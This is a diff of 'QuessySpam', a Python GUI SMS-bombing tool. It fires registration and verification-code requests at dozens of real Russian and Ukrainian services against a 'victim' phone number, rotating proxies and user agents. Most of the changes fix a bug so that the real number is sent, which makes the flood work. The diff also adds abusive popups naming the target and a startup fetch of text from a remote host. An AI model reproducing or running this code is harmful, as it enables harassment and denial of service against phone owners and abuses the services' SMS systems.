@@ -1,4 +1,4 @@
-﻿import requests
+import requests
 import fake_useragent
 import random
 import os
@@ -9,12 +9,16 @@ import threading
 import time
 import tkinter.scrolledtext as tkscrolled
 from bs4 import BeautifulSoup
+from tkinter import messagebox as mb
 
 root = Tk()
 root.title(u'QuessySpam')
+root.iconbitmap("iconka.ico")
 root.geometry('817x400')
 root['bg'] = '#141414'
 root.resizable(False, False)
+
+mb.showinfo(title="QuessySpam", message="Good fucked phones!")
 
 def apchhuy():
     while True:
@@ -86,11 +90,11 @@ class SMSAttack:
         iteration = 0
         sms_amount = 0
         _phone9 = _phone[1:]
-        _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
-        _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
-        _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
-        _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
-        _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
+        _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
+        _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
+        _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
+        _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
+        _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
         _email = _name+f'{iteration}'+'@gmail.com'
         email = _name+f'{iteration}'+'@gmail.com'
         request_timeout = 0.00001
@@ -1187,7 +1191,7 @@ class SMSAttack:
             	logs.insert('insert', '\n[-] Lenta Не отправлено!')
 
             try:
-            	requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={'phone': '_phone', 'api': 2, 'email': 'email','x-email': 'x-email'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+            	requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={'phone': _phone, 'api': 2, 'email': 'email','x-email': 'x-email'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
             	logs.insert('insert', '\n[+] Cloud.mail Отправлено!')
             except:
             	logs.insert('insert', '\n[-] Cloud.mail Не отправлено!')
@@ -1247,31 +1251,31 @@ class SMSAttack:
             	logs.insert('insert', '\n[-] Imgur Не отправлено!')
               
             try:
-              requests.post("https://www.monobank.com.ua/api/mobapplink/send", data={'phone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+              requests.post("https://www.monobank.com.ua/api/mobapplink/send", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] MonoBank Отправлено!')
             except:
               logs.insert('insert', '\n[-] MonoBank Не отправлено!')
               
             try:
-               requests.post("https://account.my.games/signup_send_sms/", data={'phone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://account.my.games/signup_send_sms/", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] My Games Отправлено!')
             except:
                logs.insert('insert', '\n[-] My Games Не отправлено!')
               
             try:
-               requests.post("https://www.moyo.ua/identity/registration", data={'phone':'_phone','firstname':'Иван','email':'mail@mail.com'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://www.moyo.ua/identity/registration", data={'phone':_phone,'firstname':'Иван','email':'mail@mail.com'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Moyo Отправлено!')
             except:
                logs.insert('insert', '\n[-] Moyo Не отправлено!')
                
             try:
-               requests.post("https://secure.online.ua/ajax/check_phone?reg_phone=_phone")
+               requests.post("https://secure.online.ua/ajax/check_phone?reg_phone="+_phone+"")
                logs.insert('insert', '\n[+] Secure.online Отправлено!')
             except:
                logs.insert('insert', '\n[-] Secure.online Не отправлено!')
                
             try:
-               requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg", data={'telephone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg", data={'telephone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] PirogiNomerOdin Отправлено!')
             except:
                logs.insert('insert', '\n[-] PirogiNomerOdin Не отправлено!')
@@ -1283,49 +1287,49 @@ class SMSAttack:
                logs.insert('insert', '\n[-] PlanetaKino Не отправлено!')
                
             try:
-               requests.post("https://pizzasinizza.ru/api/phoneCode.php", data={'phone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://pizzasinizza.ru/api/phoneCode.php", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] PizzaSinizza Отправлено!')
             except:
                logs.insert('insert', '\n[-] PizzaSinizza Не отправлено!')
                
             try:
-               requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php", data={'phone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] RichFamily Отправлено!')
             except:
                logs.insert('insert', '\n[-] RichFamily Не отправлено!')
                
             try:
-               requests.post("https://www.prosushi.ru/php/profile.php", data={'phone':'_phone','mode':'sms'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://www.prosushi.ru/php/profile.php", data={'phone':_phone,'mode':'sms'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] ProSushi Отправленo!')
             except:
                logs.insert('insert', '\n[-] ProSushi Не отправлено!')
                
             try:
-               requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", data={'demo_number':'_phone','ajax_demo_send':'1'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", data={'demo_number':_phone,'ajax_demo_send':'1'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] SMS4b Отправлено!')
             except:
                logs.insert('insert', '\n[-] SMS4b Не отправлено!')
                
             try:
-               requests.post("https://kasta.ua/api/v2/login/", data={'phone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://kasta.ua/api/v2/login/", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Kasta Отправлено!')
             except:
                logs.insert('insert', '\n[-] Kasta Не отправлено!')
                
             try:
-               requests.post("https://app.benzuber.ru/login", data={'phone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://app.benzuber.ru/login", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Benzuber Отправлено!')
             except:
                logs.insert('insert', '\n[-] Benzuber Не отправлено!')
                
             try:
-               requests.post("https://bamper.by/registration/?step=1", data={'phone': '_phone', 'submit': 'Запросить смс подтверждения', 'rules': 'on'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://bamper.by/registration/?step=1", data={'phone': _phone, 'submit': 'Запросить смс подтверждения', 'rules': 'on'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Bamper Отправлено!')
             except:
                logs.insert('insert', '\n[-] Bamper Не отправлено!')
                
             try:
-               requests.post("https://eda.yandex/api/v1/user/request_authentication_code", data={'phone_number':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://eda.yandex/api/v1/user/request_authentication_code", data={'phone_number':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Yandex Eda Отправлено!')
             except:
                logs.insert('insert', '\n[-] Yandex Eda Не отправлено!')
@@ -1343,25 +1347,25 @@ class SMSAttack:
                logs.insert('insert', '\n[-] Sipnet Не отправлено!')
                
             try:
-               requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", data={'phone':'_phone','otpId':0}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", data={'phone':_phone,'otpId':0}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Ozon Отправлено!')
             except:
                logs.insert('insert', '\n[-] Ozon Не отправлено!')
                
             try:
-               requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={'phone_number':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={'phone_number':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Tinder Отправлено!')
             except:
                logs.insert('insert', '\n[-] Tinder Не отправлено!')
                
             try:
-               requests.post("https://city24.ua/personalaccount/account/registration", data={'PhoneNumber':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://city24.ua/personalaccount/account/registration", data={'PhoneNumber':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] City24 Отправлено!')
             except:
                logs.insert('insert', '\n[-] City24 Не отправлено!')
                
             try:
-               requests.post("https://auth.multiplex.ua/login", json={'login':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://auth.multiplex.ua/login", json={'login':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Multiplex Отправлено!')
             except:
                logs.insert('insert', '\n[-] Multiplex Не отправлено!')
@@ -1438,7 +1442,7 @@ class SMSAttack:
             	logs.insert('insert', '\n[-] SunLight Не отправлено!')
 
             try:
-            	requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': '_email', 'mobile_phone': '_phone', 'deliveryOption': 'sms'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+            	requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': '_email', 'mobile_phone': _phone, 'deliveryOption': 'sms'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
             	logs.insert('insert', '\n[+] ALPARI Отправлено!')
             except:
             	logs.insert('insert', '\n[-] ALPARI Не отправлено!')
@@ -1522,13 +1526,13 @@ class SMSAttack:
             	logs.insert('insert', '\n[-] Ivi.ru Не отправлено!')
 
             try:
-            	requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+            	requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
             	logs.insert('insert', '\n[+] Lenta Отправлено!')
             except:
             	logs.insert('insert', '\n[-] Lenta Не отправлено!')
 
             try:
-            	requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={'phone': '_phone', 'api': 2, 'email': 'email','x-email': 'x-email'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+            	requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={'phone': _phone, 'api': 2, 'email': 'email','x-email': 'x-email'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
             	logs.insert('insert', '\n[+] Cloud.mail Отправлено!')
             except:
             	logs.insert('insert', '\n[-] Cloud.mail Не отправлено!')
@@ -1576,91 +1580,91 @@ class SMSAttack:
             	logs.insert('insert', '\n[-] Finam.ru Не отправлено!')
             	
             try:
-            	requests.post("https://api.imgur.com/account/v1/phones/verify", data={"phone_number":"_phone","region_code":"RU"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+            	requests.post("https://api.imgur.com/account/v1/phones/verify", data={"phone_number":_phone,"region_code":"RU"}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
             	logs.insert('insert', '\n[+] Imgur Отправлено!')
             except:
             	logs.insert('insert', '\n[-] Imgur Не отправлено!')
               
             try:
-              requests.post("https://www.monobank.com.ua/api/mobapplink/send", data={'phone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+              requests.post("https://www.monobank.com.ua/api/mobapplink/send", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
               logs.insert('insert', '\n[+] MonoBank Отправлено!')
             except:
               logs.insert('insert', '\n[-] MonoBank Не отправлено!')
               
             try:
-               requests.post("https://account.my.games/signup_send_sms/", data={'phone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://account.my.games/signup_send_sms/", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] My Games Отправлено!')
             except:
                logs.insert('insert', '\n[-] My Games Не отправлено!')
               
             try:
-               requests.post("https://www.moyo.ua/identity/registration", data={'phone':'_phone','firstname':'Иван','email':'mail@mail.com'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://www.moyo.ua/identity/registration", data={'phone':_phone,'firstname':'Иван','email':'mail@mail.com'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Moyo Отправлено!')
             except:
                logs.insert('insert', '\n[-] Moyo Не отправлено!')
                
             try:
-               requests.post("https://secure.online.ua/ajax/check_phone?reg_phone=_phone")
+               requests.post("https://secure.online.ua/ajax/check_phone?reg_phone="+_phone+"")
                logs.insert('insert', '\n[+] Secure.online Отправлено!')
             except:
                logs.insert('insert', '\n[-] Secure.online Не отправлено!')
                
             try:
-               requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg", data={'telephone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg", data={'telephone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] PirogiNomerOdin Отправлено!')
             except:
                logs.insert('insert', '\n[-] PirogiNomerOdin Не отправлено!')
                
             try:
-               requests.post("https://cabinet.planetakino.ua/service/sms?phone=_phone")
+               requests.post("https://cabinet.planetakino.ua/service/sms?phone="+_phone+"")
                logs.insert('insert', '\n[+] PlanetaKino Отправлено!')
             except:
                logs.insert('insert', '\n[-] PlanetaKino Не отправлено!')
                
             try:
-               requests.post("https://pizzasinizza.ru/api/phoneCode.php", data={'phone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://pizzasinizza.ru/api/phoneCode.php", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] PizzaSinizza Отправлено!')
             except:
                logs.insert('insert', '\n[-] PizzaSinizza Не отправлено!')
                
             try:
-               requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php", data={'phone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://richfamily.ru/ajax/sms_activities/sms_validate_phone.php", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] RichFamily Отправлено!')
             except:
                logs.insert('insert', '\n[-] RichFamily Не отправлено!')
                
             try:
-               requests.post("https://www.prosushi.ru/php/profile.php", data={'phone':'_phone','mode':'sms'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://www.prosushi.ru/php/profile.php", data={'phone':_phone,'mode':'sms'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] ProSushi Отправленo!')
             except:
                logs.insert('insert', '\n[-] ProSushi Не отправлено!')
                
             try:
-               requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", data={'demo_number':'_phone','ajax_demo_send':'1'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", data={'demo_number':_phone,'ajax_demo_send':'1'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] SMS4b Отправлено!')
             except:
                logs.insert('insert', '\n[-] SMS4b Не отправлено!')
                
             try:
-               requests.post("https://kasta.ua/api/v2/login/", data={'phone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://kasta.ua/api/v2/login/", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Kasta Отправлено!')
             except:
                logs.insert('insert', '\n[-] Kasta Не отправлено!')
                
             try:
-               requests.post("https://app.benzuber.ru/login", data={'phone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://app.benzuber.ru/login", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Benzuber Отправлено!')
             except:
                logs.insert('insert', '\n[-] Benzuber Не отправлено!')
                
             try:
-               requests.post("https://bamper.by/registration/?step=1", data={'phone': '_phone', 'submit': 'Запросить смс подтверждения', 'rules': 'on'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://bamper.by/registration/?step=1", data={'phone': _phone, 'submit': 'Запросить смс подтверждения', 'rules': 'on'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Bamper Отправлено!')
             except:
                logs.insert('insert', '\n[-] Bamper Не отправлено!')
                
             try:
-               requests.post("https://eda.yandex/api/v1/user/request_authentication_code", data={'phone_number':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://eda.yandex/api/v1/user/request_authentication_code", data={'phone_number':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Yandex Eda Отправлено!')
             except:
                logs.insert('insert', '\n[-] Yandex Eda Не отправлено!')
@@ -1672,61 +1676,61 @@ class SMSAttack:
                logs.insert('insert', '\n[-] Yandex Chef Не отправлено!')
                
             try:
-               requests.post("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?phone=_phone&callmode=1&oper=9")
+               requests.post("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?phone="+_phone+"&callmode=1&oper=9")
                logs.insert('insert', '\n[+] Sipnet Отправлено!')
             except:
                logs.insert('insert', '\n[-] Sipnet Не отправлено!')
                
             try:
-               requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", data={'phone':'_phone','otpId':0}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry", data={'phone':_phone,'otpId':0}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Ozon Отправлено!')
             except:
                logs.insert('insert', '\n[-] Ozon Не отправлено!')
                
             try:
-               requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={'phone_number':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", data={'phone_number':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Tinder Отправлено!')
             except:
                logs.insert('insert', '\n[-] Tinder Не отправлено!')
                
             try:
-               requests.post("https://city24.ua/personalaccount/account/registration", data={'PhoneNumber':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://city24.ua/personalaccount/account/registration", data={'PhoneNumber':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] City24 Отправлено!')
             except:
                logs.insert('insert', '\n[-] City24 Не отправлено!')
                
             try:
-               requests.post("https://auth.multiplex.ua/login", json={'login':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://auth.multiplex.ua/login", json={'login':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Multiplex Отправлено!')
             except:
                logs.insert('insert', '\n[-] Multiplex Не отправлено!')
                
             try:
-               requests.post("https://yaponchik.net/login/login.php", data={'login': 'Y','countdown': '0','step': '_phone','redirect': '/profile/','phone':'_phone', 'code':''}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://yaponchik.net/login/login.php", data={'login': 'Y','countdown': '0','step': _phone,'redirect': '/profile/','phone':_phone, 'code':''}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Yaponchik Отправлено!')
             except:
                logs.insert('insert', '\n[-] Yaponchik Не отправлено!')
                
             try:
-               requests.post("https://api.iconjob.co/api/auth/verification_code",json={'phone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://api.iconjob.co/api/auth/verification_code",json={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] IconJob Отправлено!')
             except:
                logs.insert('insert', '\n[-] IconJob Не отправлено!')
                
             try:
-               requests.post("https://ng-api.webbankir.com/user/v2/create", json={'lastName':'Луманов','firstName':'Сергей','middleName':'Иванович',"mobilePhone":'_phone',"email":'_email','smsCode':''}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://ng-api.webbankir.com/user/v2/create", json={'lastName':'Луманов','firstName':'Сергей','middleName':'Иванович',"mobilePhone":_phone,"email":'_email','smsCode':''}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] WebBankir Отправлено!')
             except:
                logs.insert('insert', '\n[-] WebBankir Не отправлено!')
                
             try:
-               requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={'phone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Shop vsk Отправлено!')
             except:
                logs.insert('insert', '\n[-] Shop vsk Не отправлено!')
                
             try:
-               requests.post("https://thehive.pro/auth/signup", json={'phone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://thehive.pro/auth/signup", json={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Thehive Отправлено!')
             except:
                logs.insert('insert', '\n[-] Thehive Не отправлено!')
@@ -1810,37 +1814,37 @@ class SMSAttack:
                logs.insert('insert', '\n[-] MobilePlanet Не отправлено!')
                
             try:
-               requests.post("https://pampik.com/callback", data={'phoneCallback':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://pampik.com/callback", data={'phoneCallback':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Pampik Отправлено!')
             except:
                logs.insert('insert', '\n[-] Pampik Не отправлено!')
                
             try:
-               requests.post("https://my.dianet.com.ua/send_sms/", data={'phone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://my.dianet.com.ua/send_sms/", data={'phone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Dianet Отправлено!')
             except:
                logs.insert('insert', '\n[-] Dianet Не отправлено!')
                
             try:
-               requests.post("https://api.easypay.ua/api/auth/register", data={'phone':'_phone','password':'_password'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://api.easypay.ua/api/auth/register", data={'phone':_phone,'password':'_password'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] EazyPay Отправлено!')
             except:
                logs.insert('insert', '\n[-] EazyPay Не отправлено!')
                
             try:
-               requests.post("https://fix-price.ru/ajax/register_phone_code.php", data={'phone':'_phone_','action':'getCode','register_call':'Y'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://fix-price.ru/ajax/register_phone_code.php", data={'phone':_phone,'action':'getCode','register_call':'Y'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Fix-Price Отправлено!')
             except:
                logs.insert('insert', '\n[-] Fix-Price Не отправлено!')
                
             try:
-               requests.post("https://foodband.ru/api?phone=_phone&call=customers/sendVerificationCode&g-recaptcha-response=")
+               requests.post("https://foodband.ru/api?phone="+_phone+"&call=customers/sendVerificationCode&g-recaptcha-response=")
                logs.insert('insert', '\n[+] FoodBand Отправлено!')
             except:
                logs.insert('insert', '\n[-] FoodBand Не отправлено!')
                
             try:
-               requests.post("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code?number=_phone")
+               requests.post("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code?number="+_phone+"")
                logs.insert('insert', '\n[+] oapi Отправлено!')
             except:
                logs.insert('insert', '\n[-] oapi Не отправлено!')
@@ -1858,13 +1862,13 @@ class SMSAttack:
                logs.insert('insert', '\n[-] VeziTaxi Не отправлено!')
                
             try:
-               requests.post("https://tehnosvit.ua/iwantring_feedback.html", data={'feedbackName':'%name%','feedbackPhone':'_phone'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://tehnosvit.ua/iwantring_feedback.html", data={'feedbackName':_name,'feedbackPhone':_phone}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] TehnoSvit Отправлено!')
             except:
                logs.insert('insert', '\n[-] TehnoSvit Не отправлено!')
                
             try:
-               requests.post("https://my.citrus.ua/api/v2/register", data={'email':'email','name':'_name','phone':'_phone','password':'!@#qwe','confirm_passwor':'!@#qwe'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
+               requests.post("https://my.citrus.ua/api/v2/register", data={'email':email,'name':_name,'phone':_phone,'password':'!@#qwe','confirm_passwor':'!@#qwe'}, headers = {'User-Agent': self.ua.random}, proxies = random.choice(self.proxy))
                logs.insert('insert', '\n[+] Citrus Отправлено!')
             except:
                logs.insert('insert', '\n[-] Citrus Не отправлено!')
@@ -1881,9 +1885,22 @@ class SMSAttack:
                logs.insert('insert', '\n[+] AnyTime Отправлено!')
             except:
                logs.insert('insert', '\n[-] AnyTime Hе отправлено!')
-        
+
+class News:
+    def __init__(self):
+        self.url = 'http://f0502358.xsph.ru/news'
+    def start(self):
+        try:
+            r = requests.get(self.url)
+            news = r.text
+            logs.insert('insert', news)
+        except:
+            logs.insert('insert', '\n[-] Error of parsing news')
+
+
 def flud():
     _phone = e1.get()
+    mb.showinfo(title="QuessySpam", message="Fucking " + _phone + "!")
     tututu = threading.Thread(target=burjui)
     tututu.start()
 
@@ -1898,6 +1915,7 @@ def onProxyClick():
         proxV = False
 
 global proxV
+
 proxV = False
 
 var = BooleanVar()
@@ -1910,7 +1928,7 @@ cb = Checkbutton(root,
     variable=var,
     command=onProxyClick)
 cb.pack()
-cb.place(x = 0, y = 127)
+cb.place(x = 155, y = 67)
 
 t1 = Label(root,
     text = 'Номерок жертвы', 
@@ -1946,4 +1964,6 @@ logs = tkscrolled.ScrolledText(root,
 logs.pack()
 logs.place(x = 400, y = 0)
 
+news = News()
+news.start()
 root.mainloop()
